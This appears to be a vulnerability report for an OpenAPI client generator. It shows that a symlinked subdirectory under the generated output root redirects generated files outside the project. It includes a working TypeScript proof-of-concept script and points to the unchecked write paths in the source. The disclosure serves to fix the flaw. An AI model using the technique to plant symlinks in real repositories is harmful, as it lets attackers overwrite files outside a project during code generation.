# Toolcraft OpenAPI follows a symlinked generated child directory and writes outside the output root

## Summary

`toolcraft-openapi-generate` can escape a real `src/generated` output root through a symlinked generated child directory. An operation whose generated file belongs below that child causes normal generation to write outside the project even when the top-level output directory itself is not a symlink.

## Reproduction

1. From the repository root, save this disposable probe as `probe.mts`:

   ```ts
   import fs from "node:fs/promises";
   import os from "node:os";
   import path from "node:path";
   import { runGenerateCli } from "./packages/toolcraft-openapi/src/bin/generate.ts";

   const root = await fs.mkdtemp(path.join(os.tmpdir(), "poe-openapi-child-"));
   const project = path.join(root, "project");
   const outside = path.join(root, "outside");
   const spec = JSON.stringify({
     openapi: "3.0.3",
     info: { title: "Probe", version: "1.0.0" },
     paths: {
       "/bots": {
         get: {
           tags: ["bots"],
           operationId: "listBots",
           responses: { "200": { description: "ok" } }
         }
       }
     }
   }, null, 2);

   await fs.mkdir(path.join(project, "src", "generated"), { recursive: true });
   await fs.mkdir(outside, { recursive: true });
   await fs.writeFile(path.join(project, "openapi.json"), spec, "utf8");
   await fs.symlink(outside, path.join(project, "src", "generated", "bots"));

   await runGenerateCli(["node", "generate"], {
     cwd: project,
     fetch: globalThis.fetch,
     fs,
     stdout: { write: () => true },
     stderr: { write: () => true }
   });

   console.log(await fs.readdir(outside));
   console.log(await fs.realpath(path.join(project, "src", "generated", "bots")));
   ```

2. Execute it with `./node_modules/.bin/tsx ./probe.mts`.

## Observed Behavior

The generator exits successfully while `src/generated` remains a real project directory. It writes the generated operation file `list.ts` into the external directory reached through `src/generated/bots`, while writing `src/generated/index.ts` locally.

`generate()` emits nested generated file paths such as `bots/list.ts` from operation metadata in `packages/toolcraft-openapi/src/generate.ts:429`. `syncGeneratedClient()` lexically combines those paths with the output root in `packages/toolcraft-openapi/src/bin/generate.ts:137`, and `writeGeneratedFiles()` writes them in `packages/toolcraft-openapi/src/bin/generate.ts:333` without checking descendant symlinks.

## Expected Behavior

Generated files should remain canonically inside the configured output directory. A symlinked descendant beneath a legitimate output root should be rejected or handled without allowing writes outside that root.

## Impact

A crafted repository can redirect selected generated operation modules outside its output tree while keeping `src/generated` itself non-symlinked. This bypasses defenses that only validate the output root and provides an external overwrite primitive during normal code generation in local or automated workflows.
